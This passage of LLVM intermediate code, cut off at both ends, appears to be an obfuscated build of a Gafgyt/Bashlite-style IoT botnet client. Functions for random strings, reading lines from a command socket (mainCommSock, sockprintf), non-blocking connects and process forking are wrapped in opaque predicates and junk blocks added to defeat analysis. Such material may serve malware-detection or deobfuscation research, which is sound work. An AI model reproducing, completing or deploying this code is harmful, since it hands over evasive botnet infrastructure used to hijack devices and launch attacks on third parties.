  %23 = icmp eq i8* %21, %22
  %24 = load i32, i32* @x.35
  %25 = load i32, i32* @y.36
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %51

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.35
  %34 = load i32, i32* @y.36
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* %1, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %1, align 4
  %43 = load i32, i32* @x.35
  %44 = load i32, i32* @y.36
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart27, %originalBBpart2
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:53:                                     ; preds = %5
  %54 = load i32, i32* %2, align 4
  %55 = call i32 @close(i32 %54)
  %56 = load i32, i32* %1, align 4
  ret i32 %56

originalBBalteredBB:                              ; preds = %originalBB, %10
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %57)
  %58 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %59 = call i8* @strstr(i8* %58, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %61 = icmp eq i8* %59, %60
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %62 = load i32, i32* %1, align 4
  %_ = sub i32 0, %62
  %gen = add i32 %_, 1
  %_2 = shl i32 %62, 1
  %_3 = sub i32 %62, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %62, 1
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %1, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.37
  %12 = load i32, i32* @y.38
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.37
  %28 = load i32, i32* @y.38
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %39 = call i32 @rand_cmwc()
  %_ = sub i32 0, %39
  %gen = add i32 %_, 26
  %_1 = sub i32 0, %39
  %gen2 = add i32 %_1, 26
  %_3 = sub i32 0, %39
  %gen4 = add i32 %_3, 26
  %_5 = sub i32 0, %39
  %gen6 = add i32 %_5, 26
  %40 = urem i32 %39, 26
  %_7 = sub i32 %40, 65
  %gen8 = mul i32 %_7, 65
  %_9 = shl i32 %40, 65
  %_10 = sub i32 %40, 65
  %gen11 = mul i32 %_10, 65
  %_12 = sub i32 %40, 65
  %gen13 = mul i32 %_12, 65
  %_14 = sub i32 %40, 65
  %gen15 = mul i32 %_14, 65
  %_16 = sub i32 %40, 65
  %gen17 = mul i32 %_16, 65
  %_18 = shl i32 %40, 65
  %_19 = sub i32 %40, 65
  %gen20 = mul i32 %_19, 65
  %_21 = shl i32 %40, 65
  %41 = add i32 %40, 65
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  store i8 %42, i8* %46, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.39
  %5 = load i32, i32* @y.40
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.__sigset_t, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.39
  %33 = load i32, i32* @y.40
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %41, i64 0, i64 0
  %43 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %42) #2, !srcloc !1
  %44 = extractvalue { i64, i64* } %43, 0
  %45 = extractvalue { i64, i64* } %43, 1
  %46 = trunc i64 %44 to i32
  store i32 %46, i32* %18, align 4
  %47 = ptrtoint i64* %45 to i64
  %48 = trunc i64 %47 to i32
  store i32 %48, i32* %19, align 4
  br label %49

; <label>:49:                                     ; preds = %40
  %50 = load i32, i32* %13, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %55 = load i32, i32* %13, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %120

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %115, %65
  %67 = load i32, i32* %21, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %119

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0))
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %69
  %75 = load i32, i32* @x.39
  %76 = load i32, i32* @y.40
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %84 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 0
  %85 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %84) #2, !srcloc !2
  %86 = extractvalue { i64, i64* } %85, 0
  %87 = extractvalue { i64, i64* } %85, 1
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %22, align 4
  %89 = ptrtoint i64* %87 to i64
  %90 = trunc i64 %89 to i32
  store i32 %90, i32* %23, align 4
  %91 = load i32, i32* @x.39
  %92 = load i32, i32* @y.40
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* %13, align 4
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %105 = load i32, i32* %13, align 4
  %106 = sdiv i32 %105, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %104, i64 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %109, %103
  store i64 %110, i64* %108, align 8
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, 1
  %113 = call i32 @select(i32 %112, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %113, i32* %20, align 4
  %114 = icmp sle i32 %113, 0
  br i1 %114, label %115, label %118

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* %21, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %21, align 4
  br label %66

; <label>:118:                                    ; preds = %99
  br label %119

; <label>:119:                                    ; preds = %118, %66
  br label %120

; <label>:120:                                    ; preds = %119, %49
  store i32 0, i32* %26, align 4
  %121 = load i8*, i8** %14, align 8
  store i8* %121, i8** %25, align 8
  br label %122

; <label>:122:                                    ; preds = %140, %120
  %123 = load i32, i32* %15, align 4
  %124 = add nsw i32 %123, -1
  store i32 %124, i32* %15, align 4
  %125 = icmp sgt i32 %123, 1
  br i1 %125, label %126, label %143

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i64 @recv(i32 %127, i8* %24, i64 1, i32 0)
  %129 = icmp ne i64 %128, 1
  br i1 %129, label %130, label %132

; <label>:130:                                    ; preds = %126
  %131 = load i8*, i8** %25, align 8
  store i8 0, i8* %131, align 1
  store i32 -1, i32* %12, align 4
  br label %146

; <label>:132:                                    ; preds = %126
  %133 = load i8, i8* %24, align 1
  %134 = load i8*, i8** %25, align 8
  %135 = getelementptr inbounds i8, i8* %134, i32 1
  store i8* %135, i8** %25, align 8
  store i8 %133, i8* %134, align 1
  %136 = load i8, i8* %24, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 10
  br i1 %138, label %139, label %140

; <label>:139:                                    ; preds = %132
  br label %143

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %26, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %26, align 4
  br label %122

; <label>:143:                                    ; preds = %139, %122
  %144 = load i8*, i8** %25, align 8
  store i8 0, i8* %144, align 1
  %145 = load i32, i32* %26, align 4
  store i32 %145, i32* %12, align 4
  br label %146

; <label>:146:                                    ; preds = %143, %130
  %147 = load i32, i32* %12, align 4
  ret i32 %147

originalBBalteredBB:                              ; preds = %originalBB, %3
  %148 = alloca i32, align 4
  %149 = alloca i32, align 4
  %150 = alloca i8*, align 8
  %151 = alloca i32, align 4
  %152 = alloca %struct.__sigset_t, align 8
  %153 = alloca %struct.timeval, align 8
  %154 = alloca i32, align 4
  %155 = alloca i32, align 4
  %156 = alloca i32, align 4
  %157 = alloca i32, align 4
  %158 = alloca i32, align 4
  %159 = alloca i32, align 4
  %160 = alloca i8, align 1
  %161 = alloca i8*, align 8
  %162 = alloca i32, align 4
  store i32 %0, i32* %149, align 4
  store i8* %1, i8** %150, align 8
  store i32 %2, i32* %151, align 4
  %163 = load i8*, i8** %150, align 8
  %164 = load i32, i32* %151, align 4
  %165 = sext i32 %164 to i64
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 %165, i32 1, i1 false)
  %166 = getelementptr inbounds %struct.timeval, %struct.timeval* %153, i32 0, i32 0
  store i64 30, i64* %166, align 8
  %167 = getelementptr inbounds %struct.timeval, %struct.timeval* %153, i32 0, i32 1
  store i64 0, i64* %167, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %168 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %169 = getelementptr inbounds [16 x i64], [16 x i64]* %168, i64 0, i64 0
  %170 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %169) #2, !srcloc !2
  %171 = extractvalue { i64, i64* } %170, 0
  %172 = extractvalue { i64, i64* } %170, 1
  %173 = trunc i64 %171 to i32
  store i32 %173, i32* %22, align 4
  %174 = ptrtoint i64* %172 to i64
  %175 = trunc i64 %174 to i32
  store i32 %175, i32* %23, align 4
  br label %originalBB1
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %139

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %121

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.41
  %51 = load i32, i32* @y.42
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %59, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %61, align 8
  %62 = load i32, i32* @x.41
  %63 = load i32, i32* @y.42
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #2, !srcloc !3
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %119

; <label>:95:                                     ; preds = %79
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #2
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %95
  %102 = load i32, i32* @x.41
  %103 = load i32, i32* @y.42
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %101
  store i32 0, i32* %5, align 4
  %110 = load i32, i32* @x.41
  %111 = load i32, i32* @y.42
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %164

; <label>:118:                                    ; preds = %95
  br label %120

; <label>:119:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %164

; <label>:120:                                    ; preds = %118
  br label %138

; <label>:121:                                    ; preds = %45
  %122 = load i32, i32* @x.41
  %123 = load i32, i32* @y.42
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %121
  store i32 0, i32* %5, align 4
  %130 = load i32, i32* @x.41
  %131 = load i32, i32* @y.42
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %164

; <label>:138:                                    ; preds = %120
  br label %139

; <label>:139:                                    ; preds = %138, %37
  %140 = load i32, i32* @x.41
  %141 = load i32, i32* @y.42
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  %148 = load i32, i32* %6, align 4
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %148, i32 3, i8* null)
  %150 = sext i32 %149 to i64
  store i64 %150, i64* %15, align 8
  %151 = load i64, i64* %15, align 8
  %152 = and i64 %151, -2049
  store i64 %152, i64* %15, align 8
  %153 = load i32, i32* %6, align 4
  %154 = load i64, i64* %15, align 8
  %155 = call i32 (i32, i32, ...) @fcntl(i32 %153, i32 4, i64 %154)
  store i32 1, i32* %5, align 4
  %156 = load i32, i32* @x.41
  %157 = load i32, i32* @y.42
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br label %164

; <label>:164:                                    ; preds = %originalBBpart213, %originalBBpart28, %119, %originalBBpart24, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %49
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %167, i64* %168, align 8
  %169 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %169, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %101
  store i32 0, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %121
  store i32 0, i32* %5, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  %170 = load i32, i32* %6, align 4
  %171 = call i32 (i32, i32, ...) @fcntl(i32 %170, i32 3, i8* null)
  %172 = sext i32 %171 to i64
  store i64 %172, i64* %15, align 8
  %173 = load i64, i64* %15, align 8
  %_ = shl i64 %173, -2049
  %_11 = shl i64 %173, -2049
  %174 = and i64 %173, -2049
  store i64 %174, i64* %15, align 8
  %175 = load i32, i32* %6, align 4
  %176 = load i64, i64* %15, align 8
  %177 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 4, i64 %176)
  store i32 1, i32* %5, align 4
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %95

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.43
  %12 = load i32, i32* @y.44
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #2
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.43
  %27 = load i32, i32* @y.44
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart242, %originalBBpart2
  %35 = load i32, i32* @x.43
  %36 = load i32, i32* @y.44
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = zext i32 %43 to i64
  %45 = load i64, i64* @numpids, align 8
  %46 = sub i64 %45, 1
  %47 = icmp ult i64 %44, %46
  %48 = load i32, i32* @x.43
  %49 = load i32, i32* @y.44
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart230, label %originalBB17alteredBB

originalBBpart230:                                ; preds = %originalBB17
  br i1 %47, label %56, label %85

; <label>:56:                                     ; preds = %originalBBpart230
  %57 = load i32*, i32** @pids, align 8
  %58 = load i32, i32* %4, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
